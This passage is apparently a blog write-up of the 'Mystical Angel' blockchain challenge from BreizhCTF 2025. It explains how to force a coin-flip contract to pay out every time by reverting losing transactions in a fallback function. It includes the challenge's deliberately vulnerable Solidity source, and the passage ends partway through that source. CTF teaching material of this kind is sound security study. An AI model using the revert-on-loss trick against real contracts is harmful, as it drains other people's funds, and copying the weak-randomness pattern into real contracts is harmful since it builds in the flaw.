<!DOCTYPE html>
<html lang="en"><head>

  
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="">  


  
  <meta property="og:type" content="website">
  <meta property="og:description" content="Mystical angel writeup, BreizhCTF 2025." />
  <meta property="og:image" content="https://wepfen.github.io//images/memes/ricardo-mystical-angel.png" />
  <meta property="og:url" content="https://wepfen.github.io/writeups/breizh-2025-mystical-angel/">
  <meta property="og:title" content="BreizhCTF 2025 - Mystical Angel [blockchain]">
  <meta property="og:site_name" content="wepfen.github.io">

  
  <meta name="twitter:card" content="summary_large_image">
  <meta property="twitter:domain" content="wepfen.github.io">
  <meta property="twitter:url" content="https://wepfen.github.io/writeups/breizh-2025-mystical-angel/">
  <meta name="twitter:title" content="BreizhCTF 2025 - Mystical Angel [blockchain]">
  <meta name="twitter:description" content="Mystical angel writeup, BreizhCTF 2025.">
  <meta name="twitter:image" content="https://wepfen.github.io//images/memes/ricardo-mystical-angel.png">
  
  <title>
    
      BreizhCTF 2025 - Mystical Angel [blockchain]
    
  </title>


  <link rel="icon" type="image/gif" href="/images/oia-uia.gif" />
   

  
  
  
  
  <link rel="stylesheet" href="/css/main.9bb372a616563f9ecafd6e5ea0d7760c487f35e7358f212b258b477fbfa75f5264ef33aaffa0334383ffc444b631b8dc5c496c67b5830ab2ac1f1e226a1125c3.css" integrity="sha512-m7NyphZWP57K/W5eoNd2DEh/Nec1jyErJYtHf7&#43;nX1Jk7zOq/6AzQ4P/xES2MbjcXElsZ7WDCrKsHx4iahElww==" />

  


</head>

    <body a="dark">
        <main class="page-content" aria-label="Content">
            <div class="w">
<a href="/">~/</a>




<script src="/js/theme-toggle.f10bb0c6283b259e63664053a20ccc48c8b0980e44bceece1c10401c529c2040.js" integrity="sha256-8Quwxig7JZ5jZkBTogzMSMiwmA5EvO7OHBBAHFKcIEA="></script>

<button style="float: right; background: none; outline: none;" onclick="toggleTheme()">

<svg class="w-6 h-6 text-gray-800 dark:text-white theme" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
  <path fill-rule="evenodd" d="M7.05 4.05A7 7 0 0 1 19 9c0 2.407-1.197 3.874-2.186 5.084l-.04.048C15.77 15.362 15 16.34 15 18a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1c0-1.612-.77-2.613-1.78-3.875l-.045-.056C6.193 12.842 5 11.352 5 9a7 7 0 0 1 2.05-4.95ZM9 21a1 1 0 0 1 1-1h4a1 1 0 1 1 0 2h-4a1 1 0 0 1-1-1Zm1.586-13.414A2 2 0 0 1 12 7a1 1 0 1 0 0-2 4 4 0 0 0-4 4 1 1 0 0 0 2 0 2 2 0 0 1 .586-1.414Z" clip-rule="evenodd"/>
</svg>

</button>






<article>
    <p class="post-meta">
        <time datetime="2025-03-18 11:03:54 &#43;0100 CET">
            2025-03-18
        </time>
    </p>

    <h1>BreizhCTF 2025 - Mystical Angel [blockchain]</h1>

    
        <aside >
            <nav id="TableOfContents">
  <ul>
    <li><a href="#tldr">TL;DR</a></li>
    <li><a href="#introduction">Introduction</a>
      <ul>
        <li><a href="#code-reading">Code reading</a></li>
      </ul>
    </li>
    <li><a href="#solving">Solving</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav>
        </aside>
    

    <p><strong>Mystical angel</strong> writeup, BreizhCTF 2025.</p>
<blockquote>
<p>Difficulty : Easy</p>
</blockquote>
<blockquote>
<p>Team : So what if I&rsquo;m a Phreaks 2600</p>
</blockquote>
<blockquote>
<p>Description : Lors de votre périple, vous rencontrez un ange numérique qui vous propose des bénédictions à condition que vous trouvez à quel chiffre l&rsquo;ange pense. <br> <br> Après 10 bénédictions, vous pourrez vous élever et atteindre les sommets du paradis. Malheureusement, si vous échouez une fois, votre compteur se remet à 0. <br> <br> Trouvez une moyen de gagner ces 10 bénédictions.</p>
</blockquote>
<blockquote>
<p>Author : <a href="https://x.com/Clemhate2">K.L.M</a></p>
</blockquote>
<h1 id="tldr">TL;DR</h1>
<ul>
<li>You need 10 blessings to get the flag and there are 50% chance of getting a blessing. If you&rsquo;re unlucky and don&rsquo;t get a blessing, you lose all your blessings.</li>
<li>Requesting a blessing cost you ether, but if you actually get a blessing, you get it back. Otherwise you lose it.</li>
<li>Notice that when getting blessed or not, a call to the fallback function is made with 1 ether if you get blessed and 0 ether if not.</li>
<li>Set a condition to cancel the transaction when getting 0 ether after request a blessing, so you can only get blessed.</li>
<li>Get 10 blessings and get the flag.</li>
</ul>
<h1 id="introduction">Introduction</h1>
<p>For this challenge, we have to interact with a contract and get <strong>blessed</strong> 10 times by contacting <code>Blessing()</code>. But, there&rsquo;s a 50/50 chance to not get blessed and lose all the blessings we have gathered.</p>
<p>After collecting them all, we can call &ldquo;ascend()&rdquo; to solve the challenge.</p>
<p>Here is the source code :</p>
<details>
  <summary style="color: #F99417; cursor: pointer">Challenge.sol</summary>
  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">90
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">91
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">92
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">93
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#859289;font-style:italic">// Author : K.L.M 
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">// Difficulty : Easy
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span>
</span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span><span style="color:#e67e80">pragma solidity</span> <span style="color:#7a8478">^</span><span style="color:#d699b6">0</span>.<span style="color:#d699b6">8</span>.<span style="color:#d699b6">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">/*
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"> __  __           _   _           _                             _ 
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"> |  \/  |         | | (_)         | |     /\                    | |
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"> | \  / |_   _ ___| |_ _  ___ __ _| |    /  \   _ __   __ _  ___| |
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"> | |\/| | | | / __| __| |/ __/ _` | |   / /\ \ | &#39;_ \ / _` |/ _ \ |
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"> | |  | | |_| \__ \ |_| | (_| (_| | |  / ____ \| | | | (_| |  __/ |
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"> |_|  |_|\__, |___/\__|_|\___\__,_|_| /_/    \_\_| |_|\__, |\___|_|
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">          __/ |                                        __/ |       
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">         |___/                                        |___/        
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">       .-&#34;&#34;-.                     .-&#34;&#34;-.
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">     .&#39;_.-.  |                   |  .-._&#39;.
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">    /    _/ /       _______       \ \_    \
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">   /.--.&#39; | |      `=======`      | | &#39;.--.\
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">  /   .-`-| |       ,ooooo,       | |-`-.   \
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"> ;.--&#39;:   | |     .d88888/8b.     | |   :&#39;--.;
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">|    _\.&#39;-| |    d8888888/888b    | |-&#39;./_    |
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">;_.-&#39;/:   | |   d8888P&#34;`  &#39;Y88b   | |   :\&#39;-._;
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">|   | _:-&#39;\  \.d88(` ^ _ ^  )88b./  /&#39;-:_ |   |
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">;  .:` &#39;._ \.d88888\   _   /88888b / _.&#39; `:.  ;
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">|-` &#39;-.;_ .d88888888b.___.d8888888b.` _;.-&#39; `-|
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">; / .&#39;\ | 888888888P&#39;    &#39;Y888888888b&#39;| /&#39;. \ ;
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">| .&#39; / `&#39;.8888888P&#39; `&#34;---&#34;` &#39;Y88888888&#39;` \ &#39;. |
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">;/  /\_/-`Y888888|           |8888888P-\_/\  \;
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"> |.&#39; .| `; Y88888| |       | |888888P;` |. &#39;.|
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"> |  / \.&#39;\_/Y8888| :--&#34;&#34;&#34;--: |8888P`_/&#39;./ \  |
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">  \| ; | ; |/8888| |       | |8888\| : | ; |/
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">   \ | ; | /d8888\.&#39;-.....-&#39;./8888b\ | ; | /
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">    `\ | |`d8888P&#39; / ;|: | \ &#39;Y88888`| | /`
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">     .-:_/ Y8;=&#39; .&#39; / &#39; . : &#39;. &#39;888P`\_:&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">     |  \```      .&#39;  ;     \    `:
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">      \  \                   &#39;     `&#39;.
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">   .--&#39;\  |  &#39;         &#39;       .      `-._
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">  /`;--&#39; /_.&#39;          .                  `-.
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">  |  `--`        /               \           \
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">   \       .&#39;   &#39;                 &#39;-.        |
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">    \   &#39;               &#39;          __\       |
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">     &#39;.      .                 _.-&#39;  `)     /
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">       &#39;-._                _.-&#39; `| .-`   _.&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">           `&#39;--....____.--&#39;|     (`  _.-&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">                    /  | |  \     `&#34;`
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">                    \__/ \__/
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">As a traveler, you came across a mystical angel who can bless you. Try to get 10 blessings from the angel to ascend to the heavens.
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> Challenge {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">bool</span> <span style="color:#e67e80">public</span> solved <span style="color:#7a8478">=</span> <span style="color:#e67e80">false</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> <span style="color:#e67e80">private</span> seed;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">mapping</span>(<span style="color:#dbbc7f">address</span> <span style="color:#7a8478">=&gt;</span> <span style="color:#dbbc7f">uint256</span>) <span style="color:#e67e80">public</span> blessings;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">event</span> Blessed(<span style="color:#dbbc7f">address</span> <span style="color:#e67e80">indexed</span> <span style="color:#d699b6">sender</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">event</span> Ascended(<span style="color:#dbbc7f">address</span> <span style="color:#e67e80">indexed</span> <span style="color:#d699b6">sender</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>() <span style="color:#e67e80">payable</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span> <span style="color:#7a8478">==</span> <span style="color:#d699b6">2</span> <span style="color:#e67e80">ether</span>, <span style="color:#b2c98f">&#34;Insufficient funds&#34;</span>);
</span></span><span style="display:flex;"><span>        seed <span style="color:#7a8478">=</span> <span style="color:#d699b6">block</span>.<span style="color:#d699b6">timestamp</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">Blessing</span>() <span style="color:#e67e80">public</span> <span style="color:#e67e80">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span> <span style="color:#7a8478">==</span> <span style="color:#d699b6">1</span> <span style="color:#e67e80">ether</span>, <span style="color:#b2c98f">&#34;You must pay the right to get your blessing&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> randomNumber <span style="color:#7a8478">=</span> <span style="color:#dbbc7f">uint256</span>(<span style="color:#d699b6">keccak256</span>(<span style="color:#d699b6">abi</span>.<span style="color:#d699b6">encodePacked</span>(seed, <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, <span style="color:#d699b6">block</span>.prevrandao, <span style="color:#d699b6">block</span>.<span style="color:#d699b6">timestamp</span>)));
</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> AngelNumber <span style="color:#7a8478">=</span> randomNumber <span style="color:#7a8478">%</span> <span style="color:#d699b6">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">if</span> (AngelNumber <span style="color:#7a8478">==</span> <span style="color:#d699b6">1</span>) {
</span></span><span style="display:flex;"><span>            (<span style="color:#dbbc7f">bool</span> sent, ) <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>.<span style="color:#d699b6">call</span>{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> <span style="color:#d699b6">1</span> <span style="color:#e67e80">ether</span>}(<span style="color:#b2c98f">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#d699b6">require</span>(sent, <span style="color:#b2c98f">&#34;Failed to send Ether&#34;</span>);
</span></span><span style="display:flex;"><span>            blessings[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">+=</span> <span style="color:#d699b6">1</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">if</span> (AngelNumber <span style="color:#7a8478">==</span> <span style="color:#d699b6">0</span>) {
</span></span><span style="display:flex;"><span>            (<span style="color:#dbbc7f">bool</span> sent, ) <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>.<span style="color:#d699b6">call</span>{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> <span style="color:#d699b6">0</span> <span style="color:#e67e80">ether</span>}(<span style="color:#b2c98f">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#d699b6">require</span>(sent, <span style="color:#b2c98f">&#34;Failed to send Ether&#34;</span>);
</span></span><span style="display:flex;"><span>            blessings[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">=</span> <span style="color:#d699b6">0</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">ascend</span>() <span style="color:#e67e80">public</span> <span style="color:#e67e80">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(blessings[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">&gt;=</span> <span style="color:#d699b6">10</span>,<span style="color:#b2c98f">&#34;You have not proved your worthiness :((&#34;</span>);
</span></span><span style="display:flex;"><span>        solved <span style="color:#7a8478">=</span> <span style="color:#e67e80">true</span>;
